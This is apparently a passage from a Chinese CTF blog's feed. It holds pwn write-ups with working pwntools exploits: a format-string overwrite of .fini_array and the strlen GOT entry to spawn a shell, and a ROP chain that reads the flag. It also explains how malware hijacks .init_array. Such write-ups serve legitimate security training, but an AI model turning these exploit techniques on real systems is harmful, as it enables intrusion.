print r.recvuntil(&quot;Your choice :&quot;)
r.sendline('1')
print r.recvuntil(&quot;Size: &quot;)
r.sendline('1')

r.interactive()
</code></pre>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[利用格式化字符串漏洞覆盖.fini_array函数]]></title>
        <id>https://czh11.github.io/post/li-yong-ge-shi-hua-zi-fu-chuan-lou-dong-fu-gai-fini_array-han-shu/</id>
        <link href="https://czh11.github.io/post/li-yong-ge-shi-hua-zi-fu-chuan-lou-dong-fu-gai-fini_array-han-shu/">
        </link>
        <updated>2020-12-01T04:35:46.000Z</updated>
        <content type="html"><![CDATA[<p>攻防世界- greeting-150</p>
<p>检查一下保护</p>
<pre><code>giantbranch@ubuntu:~/Desktop$ checksec greeting-150
[*] '/home/giantbranch/Desktop/greeting-150'
    Arch:     i386-32-little
    RELRO:    No RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)

</code></pre>
<p>看一下函数</p>
<pre><code>int __cdecl main(int argc, const char **argv, const char **envp)
{
  char s; // [esp+1Ch] [ebp-84h]
  char v5; // [esp+5Ch] [ebp-44h]
  unsigned int v6; // [esp+9Ch] [ebp-4h]

  v6 = __readgsdword(0x14u);
  printf(&quot;Please tell me your name... &quot;);
  if ( !getnline(&amp;v5, 64) )
    return puts(&quot;Don't ignore me ;( &quot;);
  sprintf(&amp;s, &quot;Nice to meet you, %s :)\n&quot;, &amp;v5);
  return printf(&amp;s);
}
</code></pre>
<pre><code>size_t __cdecl getnline(char *s, int n)
{
  char *v3; // [esp+1Ch] [ebp-Ch]

  fgets(s, n, stdin);
  v3 = strchr(s, 10);
  if ( v3 )
    *v3 = 0;
  return strlen(s);
}
</code></pre>
<p>发现有个格式化字符串漏洞，但是没有循环，</p>
<pre><code>关于.init_array 和.fini_array，也就是构造函数与析构函数

大多数可执行文件是通过链接 libc 来进行编译的，因此 gcc 会将 glibc 初始化代码放入编译好的可执行文件和共享库中。 .init_array和 .fini_array 节（早期版本被称为 .ctors和 .dtors ）中存放了指向初始化代码和终止代码的函数指针。 .init_array 函数指针会在 main() 函数调用之前触发。这就意味着，可以通过重写某个指向正确地址的指针来将控制流指向病毒或者寄生代码。 .fini_array 函数指针在 main() 函数执行完之后才被触发，在某些场景下这一点会非常有用。例如，特定的堆溢出漏洞（如曾经的 Once upon a free()）会允许攻击者在任意位置写4个字节，攻击者通常会使用一个指向 shellcode 地址的函数指针来重写.fini_array 函数指针。对于大多数病毒或者恶意软件作者来说， .init_array 函数指针是最常被攻击的目标，因为它通常可以使得寄生代码在程序的其他部分执行之前就能够先运行。
</code></pre>
<p>因此这题可以利用格式化字符串漏洞覆盖.fini_array函数，重新执行main函数，同时可以利用格式化字符串漏洞覆盖strlen函数的got表，让其执行system函数。</p>
<pre><code>#!/usr/bin/env python2
#-*-coding: utf-8 -*
from pwn import *
#r=process(&quot;./greeting-150&quot;)
r=remote(&quot;220.249.52.133&quot;,39180)
context.log_level='debug'
r.recvuntil(&quot;Please tell me your name... &quot;)
fini_got=0x08049934
main=0x080485ED
system=0x08048490
strelen=0x8049A54
payload='aa'+p32(strelen+2)+p32(strelen)+p32(fini_got)+'%'+str(0x804-32)+'c%12$hn'
payload+='%'+str(0x8490-0x804)+'c%13$hn'
payload+='%'+str(0x85ED-0x8490)+'c%14$hn'
r.sendline(payload)
r.recvuntil(&quot;Please tell me your name... &quot;)
r.sendline('/bin/sh')
r.interactive()
</code></pre>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[pwntools中判断输入是否结束]]></title>
        <id>https://czh11.github.io/post/pwntools-zhong-pan-duan-shu-ru-shi-fou-jie-shu/</id>
        <link href="https://czh11.github.io/post/pwntools-zhong-pan-duan-shu-ru-shi-fou-jie-shu/">
        </link>
        <updated>2020-11-28T06:36:16.000Z</updated>
        <content type="html"><![CDATA[<p>攻防世界-Recho</p>
<p>这题很容易发现是栈溢出，但是如何从while循环中退出来，困扰了很长时间，看来wp才发现pwntools中有一个io.shutdown('send')，帮助输入结束，然后就查看了一下字符串，发现有个flag，接下来就是如何从中读取出flag了，这里用open打开，用read读出，用printf打印出来，open的系统调用号是2，而且alarm是系统调用的函数，通过gdb调试找到syscall的偏移，然后就是构造payload了。</p>
<figure data-type="image" tabindex="1"><img src="https://czh11.github.io/post-images/1606545634031.jpg" alt="" loading="lazy"></figure>
<figure data-type="image" tabindex="2"><img src="https://czh11.github.io/post-images/1606545642873.jpg" alt="" loading="lazy"></figure>
<pre><code>#!/usr/bin/env python2
#-*-coding:utf-8 -*
from pwn import *
context.log_level='debug'
r=process(&quot;./Recho&quot;)
r=remote(&quot;220.249.52.133&quot;,38037)
elf=ELF(&quot;./Recho&quot;)
write_plt=elf.plt['write']
read_plt=elf.plt['read']
alarm_plt=elf.plt['alarm']
alarm_got=elf.got['alarm']
printf_plt=elf.plt['printf']
pop_rdi=0x00000000004008a3
pop_rsi=0x00000000004008a1
pop_rdx=0x00000000004006fe
pop_rax=0x00000000004006fc
add_rdi_al=0x000000000040070d
flag=0x0601058
bss=0x0601090
payload='a'*0x38
payload+=p64(pop_rdi)+p64(alarm_got)+p64(pop_rax)+p64(0x5)+p64(add_rdi_al)
payload+=p64(pop_rdi)+p64(flag)+p64(pop_rsi)+p64(0)+p64(0)+p64(pop_rax)+p64(0x2)+p64(alarm_plt)
payload+=p64(pop_rdi)+p64(3)+p64(pop_rsi)+p64(bss+0x500)+p64(0)+p64(pop_rdx)+p64(0x50)+p64(read_plt)
payload+=p64(pop_rdi)+p64(bss+0x500)+p64(printf_plt)
r.recvuntil(&quot;Welcome to Recho server!&quot;)
r.sendline(str(0x200))
payload=payload.ljust(0x200,'\x00')
r.sendline(payload)
r.recv()
r.shutdown('send')
r.interactive()
r.close
</code></pre>
]]></content>
    </entry>
</feed>